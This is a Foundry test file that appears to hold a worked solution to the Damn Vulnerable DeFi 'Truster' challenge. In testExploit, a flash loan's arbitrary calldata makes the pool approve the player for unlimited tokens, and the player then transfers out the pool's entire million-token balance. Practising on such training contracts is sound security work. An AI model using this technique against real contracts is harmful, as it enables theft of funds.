// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";

contract Truster is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    Utilities internal utils;
    TrusterLenderPool internal trusterLenderPool;
    DamnValuableToken internal dvt;
    address payable internal owner;
    address payable internal player;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        owner = users[0];
        player = users[1];
        vm.label(owner, "Owner");
        vm.label(player, "Player");

        vm.startPrank(owner);

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        trusterLenderPool = new TrusterLenderPool(dvt);
        vm.label(address(trusterLenderPool), "Truster Lender Pool");
        assertEq(address(trusterLenderPool.token()), address(dvt));

        dvt.transfer(address(trusterLenderPool), TOKENS_IN_POOL);

        assertEq(dvt.balanceOf(address(trusterLenderPool)), TOKENS_IN_POOL);

        vm.stopPrank();

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        vm.startPrank(player);

        bytes memory data = abi.encodeWithSelector(dvt.approve.selector, player, type(uint256).max);
        trusterLenderPool.flashLoan(0, player, address(dvt), data);

        dvt.transferFrom(address(trusterLenderPool), player, dvt.balanceOf(address(trusterLenderPool)));

        vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
        assertEq(dvt.balanceOf(address(player)), TOKENS_IN_POOL);
    }
}
